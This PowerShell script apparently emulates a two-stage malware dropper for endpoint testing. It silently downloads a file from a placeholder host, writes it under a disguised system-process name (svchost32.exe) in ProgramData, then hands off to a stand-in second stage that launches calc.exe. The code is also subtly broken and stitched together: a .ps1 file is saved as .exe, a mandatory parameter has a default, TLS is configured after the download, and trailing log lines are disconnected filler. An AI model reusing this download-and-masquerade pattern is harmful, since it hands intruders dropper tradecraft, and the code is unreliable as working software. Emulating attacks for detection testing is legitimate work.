
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage2Url = 'https://example.net:443/stage1.ps1',
    [string]$Stage2Path = "C:\ProgramData\svchost32.exe",
    [string]$ActivityLog = "$env:TEMP\telemetry.json",
    [int]$StageTimeout = 89
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 89
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $StageResult = Invoke-Stage1Download -SourceUrl $Stage2Url -DestinationPath $Stage2Path -TimeoutSec $StageTimeout
    if ($StageResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $Stage2Path
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage2Url
    Destination = $Stage2Path
    TimeoutSec = $StageTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Reading configuration values"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
